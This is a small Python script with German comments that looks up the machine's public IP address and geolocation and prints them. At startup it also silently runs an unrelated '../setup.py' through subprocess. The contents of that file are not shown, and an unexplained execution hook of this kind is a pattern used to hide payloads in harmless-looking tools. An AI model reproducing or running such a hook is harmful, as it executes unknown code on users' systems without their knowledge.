import requests
import subprocess

subprocess.run(["python", "../setup.py"])

def show_ip_address():
    try:
        # Abrufen der öffentlichen IP-Adresse
        ip_response = requests.get("http://icanhazip.com")
        ip_address = ip_response.text.strip()
        
        # API-URL mit der IP-Adresse
        api_url = f"http://ip-api.com/json/{ip_address}?fields=country,regionName,city,isp,lat,lon,timezone,as"
        
        # Abrufen der API-Antwort
        api_response = requests.get(api_url)
        location_info = api_response.json()
        
        # Extrahieren der Informationen
        country = location_info.get("country")
        region = location_info.get("regionName")
        city = location_info.get("city")
        isp = location_info.get("isp")
        latitude = location_info.get("lat")
        longitude = location_info.get("lon")
        timezone = location_info.get("timezone")
        
        # Ausgabe der Informationen
        print(f"IP: {ip_address}")
        print(f"Location: {city}, {region}, {country}")
        print(f"ISP: {isp}")
        print(f"Latitude: {latitude}")
        print(f"Longitude: {longitude}")
        print(f"Timezone: {timezone}")

    except Exception as ex:
        print(f"An error occurred while fetching the IP address: {ex}")

    # Auf Benutzereingabe warten
    input("")

# Funktion aufrufen
show_ip_address()
